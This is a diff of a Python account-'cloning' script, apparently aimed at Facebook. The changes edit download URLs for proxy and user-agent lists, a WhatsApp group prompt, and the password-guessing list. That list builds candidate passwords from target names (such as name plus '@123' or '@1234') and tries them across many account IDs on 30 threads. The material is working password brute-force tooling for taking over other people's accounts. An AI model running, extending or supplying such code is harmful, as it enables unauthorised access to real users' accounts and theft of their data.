@@ -20,7 +20,7 @@ import os, platform, time, sys
 print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update...? ')
 time.sleep(5)
 os.system('clear')
-print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY SCRIPT GIFT GROUP")
+print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY WHATSAPP GROUP")
 time.sleep(2)
 os.system(f'xdg-open https://chat.whatsapp.com/C1FGP2F9QqiLL2vB02HEXT /')
 #------------------[ ANOX BABU]-------------------#
@@ -42,7 +42,7 @@ cokbrut=[]
 ses=requests.Session()
 princp=[]
 try:
-    prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
+    prox= requests.get('https://github.com/Pro-Mx-40/Api/blob/main/prox.txt').text
     open('.prox.txt','w').write(prox)
 except Exception as e:
     pass
@@ -96,7 +96,7 @@ def uaku():
         for ub in ua:
             ugen.append(ub)
     except:
-        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
+        a=requests.get('https://github.com/Pro-Max-40/ua/blob/main/bbnew.txt').text
         ua=open('bbnew.txt','w')
         aa=re.findall('line">(.*?)<',str(a))
         for un in aa:
@@ -256,7 +256,6 @@ def login_lagi334():
         os.system("rm -f .cok.txt")
         os.system("python nono.py")
         exit()
-
 #------------------[ MENU ]----------------#
  #===©===#
 class jalan:
@@ -540,7 +539,7 @@ def passwrd():
     print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mYOUR TOTAL IDz \033[0;97m:\033[1;92m ',str(len(id)))
     print("\033[97;1m[\033[92;1m•\033[97;1m] \x1b[38;5;208mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
     print("\033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mCLONING SPEED SUPER FAST-!✅")
-    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUse Flight Mode For Speed Up ')
+    print(f'\033[97;1m[\033[1;31m•\033[97;1m] \033[1;92mUse Flight Mode For Speed Up ')
     print('\033[0;97m===============================================')
     with tred(max_workers=30) as pool:
         for yuzong in id2:
@@ -559,7 +558,6 @@ def passwrd():
                     pwv.append(frs)
                     pwv.append(frs+'@123')
                     pwv.append('59039200')
-                    pwv.append(frs+'1122')
             else:
                 if len(frs)<3:
                     pwv.append(nmf)
@@ -571,8 +569,7 @@ def passwrd():
                     pwv.append(nmf)
                     pwv.append('57273200')
                     pwv.append(frs+'@123')
-                    pwv.append(frs+'@')
-                    pwv.append(frs+'1122')
+                    pwv.append(frs+'@1234')
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
                     pwv.append(xpwd)
